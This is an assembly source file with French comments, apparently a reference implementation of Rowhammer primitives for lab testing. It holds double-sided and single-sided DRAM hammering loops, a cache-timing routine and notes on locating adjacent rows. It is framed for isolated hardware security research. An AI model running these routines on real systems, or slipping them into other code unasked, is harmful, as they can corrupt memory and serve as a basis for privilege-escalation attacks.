; =============================================================================
; Nevelio Hardware Security — Rowhammer Reference Implementation (x86_64 NASM)
;
; Assembleur : NASM (Netwide Assembler)
; Architecture : x86_64, Intel syntax
;
; Ce fichier est une RÉFÉRENCE DOCUMENTAIRE pour comprendre le mécanisme
; Rowhammer au niveau assembly. L'implémentation opérationnelle est en C
; (hardware/c/userspace/rowhammer.c) qui utilise ces primitives via intrinsics.
;
; AVERTISSEMENT LÉGAL :
;   Tester Rowhammer sans autorisation écrite sur un système tiers est illégal.
;   Ce code est destiné exclusivement aux environnements de test isolés
;   (VM, machine de lab dédiée, avec snapshots pré-test).
;
; Principe Rowhammer :
;   En activant (hammering) deux rangées DRAM (rows) adjacentes à haute
;   fréquence, on induit des perturbations électromagnétiques suffisantes pour
;   inverser des bits dans la rangée cible intercalée.
;   Pattern double-sided : row_A et row_B encadrent row_C (cible).
;
; Mitigations connues :
;   - TRR (Target Row Refresh) : intégré dans les DRAM DDR4 récentes
;   - pTRR (pseudo-TRR) : variante avec compteurs hardware
;   - PARA (Probabilistic Adjacent Row Activation) : HP
;   - ECC : corrige 1 bit flip, détecte 2 bits
;   - Apple M-series : MAC randomization (non applicable sur x86)
;
; Références :
;   [1] Kim et al., "Flipping Bits in Memory Without Accessing Them" (ISCA 2014)
;   [2] Gruss et al., "Rowhammer.js" (DIMVA 2016)
;   [3] Frigo et al., "TRRespass" (IEEE S&P 2020) — bypass TRR
; =============================================================================

section .text

; =============================================================================
; void rowhammer_double_sided(void *row_a, void *row_b, uint64_t iterations)
;
; Hammer two adjacent DRAM rows at maximum frequency.
; Paramètres (calling convention SysV AMD64) :
;   rdi = adresse de row_a (agressor 1)
;   rsi = adresse de row_b (agressor 2)
;   rdx = nombre d'itérations (typiquement 1_000_000 à 10_000_000)
;
; Fonctionnement :
;   Pour chaque itération :
;     1. Lire *row_a (active le row dans le sense amplifier)
;     2. CLFLUSH row_a (invalide la cache line → force le writeback en DRAM)
;     3. MFENCE (barrière mémoire : sérialise les opérations store)
;     4. Lire *row_b
;     5. CLFLUSH row_b
;     6. MFENCE
;   La boucle tight minimise l'overhead pour maximiser le débit de hammering.
; =============================================================================

global rowhammer_double_sided
rowhammer_double_sided:
    ; Prologue : sauvegarder les registres callee-saved
    push    rbx
    push    rbp

    mov     rbx, rdi        ; rbx = row_a
    mov     rbp, rsi        ; rbp = row_b
    mov     rcx, rdx        ; rcx = iteration counter

    test    rcx, rcx
    jz      .done

.hammer_loop:
    ; ── Accès row_a ──────────────────────────────────────────────────────────
    mov     rax, [rbx]      ; Charger la valeur (active le row dans le SA)
    clflush [rbx]           ; Invalider la cache line (force accès DRAM)

    ; ── Barrière mémoire ─────────────────────────────────────────────────────
    ; MFENCE garantit que tous les stores précédents sont visibles avant de
    ; continuer. Sans MFENCE, le CPU peut réordonner et garder les données
    ; en cache, empêchant l'accès DRAM et donc le hammering.
    mfence

    ; ── Accès row_b ──────────────────────────────────────────────────────────
    mov     rax, [rbp]
    clflush [rbp]
    mfence

    dec     rcx
    jnz     .hammer_loop

.done:
    pop     rbp
    pop     rbx
    ret

; =============================================================================
; uint64_t measure_memory_access_time(void *addr)
;
; Mesure le temps d'accès à une adresse mémoire en cycles CPU.
; Retourne : nombre de cycles TSC (uint64_t dans rax)
;
; Paramètre :
;   rdi = adresse à mesurer
;
; Utilisation : comparer le temps d'accès avant/après clflush pour déterminer
; si une page est en cache (< 200 cycles) ou en DRAM (> 300 cycles).
; Seuil typique : 250 cycles sur DDR4 3200 MHz.
; =============================================================================

global measure_memory_access_time
measure_memory_access_time:
    ; Sérialiser le pipeline avant la mesure (CPUID vide la queue d'instructions)
    push    rbx
    xor     eax, eax
    cpuid                   ; CPUID sérialise — rdx, rcx, rbx, rax écrasés

    ; Lire le TSC (Time Stamp Counter)
    rdtsc                   ; edx:eax = cycle count
    shl     rdx, 32
    or      rax, rdx        ; rax = TSC complet 64 bits
    mov     r8, rax         ; r8 = tsc_start

    ; Accès mémoire mesuré
    mov     rax, [rdi]      ; Charger la valeur

    ; Barrière de lecture
    lfence                  ; LFENCE : toutes les instructions précédentes
                            ; sont terminées avant de continuer

    ; Lire le TSC après l'accès
    rdtsc
    shl     rdx, 32
    or      rax, rdx        ; rax = tsc_end

    ; Calculer le delta
    sub     rax, r8         ; rax = cycles écoulés

    pop     rbx
    ret

; =============================================================================
; void flush_cache_line(void *addr)
;
; Invalide une ligne de cache sans lecture préalable.
; Utilisé pour forcer un accès DRAM lors du prochain accès à cette adresse.
;
; Paramètre :
;   rdi = adresse à invalider
; =============================================================================

global flush_cache_line
flush_cache_line:
    clflush [rdi]
    mfence
    ret

; =============================================================================
; void hammer_single_sided(void *row, uint64_t iterations)
;
; Variante single-sided (moins efficace mais utile comme test de base).
; Certaines configurations DRAM sont vulnérables au hammering d'une seule row.
;
; Paramètres :
;   rdi = adresse de la row agresseur
;   rsi = nombre d'itérations
; =============================================================================

global hammer_single_sided
hammer_single_sided:
    push    rbx
    mov     rbx, rdi
    mov     rcx, rsi
    test    rcx, rcx
    jz      .single_done

.single_loop:
    mov     rax, [rbx]
    clflush [rbx]
    mfence
    dec     rcx
    jnz     .single_loop

.single_done:
    pop     rbx
    ret

; =============================================================================
; NOTES TECHNIQUES
;
; Taille d'une row DRAM :
;   Typiquement 8KB sur DDR4 (une bank a 2^13 = 8192 rows de 8KB chacune).
;   Pour doubler les rows dans une même bank : stride = 8KB = 0x2000 octets.
;
; Activation Rate nécessaire pour induire un bit flip :
;   Environ 139 000 activations par 64ms (refresh interval DDR4).
;   Avec une boucle tight : ~300ns/itération → ~213 000 iter/64ms → suffisant.
;
; Comptage bit flips en pratique :
;   1. Allouer 256MB de mémoire (mmap anonymous)
;   2. mlock() pour éviter le swap
;   3. Remplir avec pattern connu (0x00, 0xFF, ou 0x55/0xAA)
;   4. Identifier deux rows dans la même bank (physiquement adjacentes)
;   5. Hammer 1M+ fois
;   6. Scanner la zone cible pour comparer avec le pattern initial
;   7. Compter les octets différents → bit flips
;
; Identification des rows dans la même bank :
;   Nécessite soit : huge pages (1GB) avec connaissance de la physique,
;   ou /proc/self/pagemap pour lire les adresses physiques (root requis).
; =============================================================================
